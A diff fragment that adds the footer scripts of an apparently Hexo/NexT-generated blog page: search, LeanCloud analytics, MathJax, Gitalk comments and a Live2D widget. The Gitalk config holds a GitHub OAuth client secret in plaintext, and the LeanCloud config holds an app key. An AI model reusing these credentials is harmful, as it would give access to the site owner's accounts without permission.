+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"o2OHCYF4i2z8Fu6sPsBGNnwJ-gzGzoHsz","app_key":"vVprl1Ih2X5u0SmQo6NnSmR8","server_url":"https://o2ohcyf4.lc-cn-n1-shared.com","security":false}</script>
+  <script src="/js/third-party/statistics/lean-analytics.js"></script>
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"plusls","repo":"plusls.github.io","client_id":"be430880e81b9f6f1789","client_secret":"bc1c24724cc38b3457292eb0390cca30e24c8fba","admin_user":"plusls","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"d4a02a16c0a1b18817f95ce46be1e177"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/sagiri.model.json"},"mobile":{"show":false,"scale":0.5},"log":false});</script></body>
+</html>
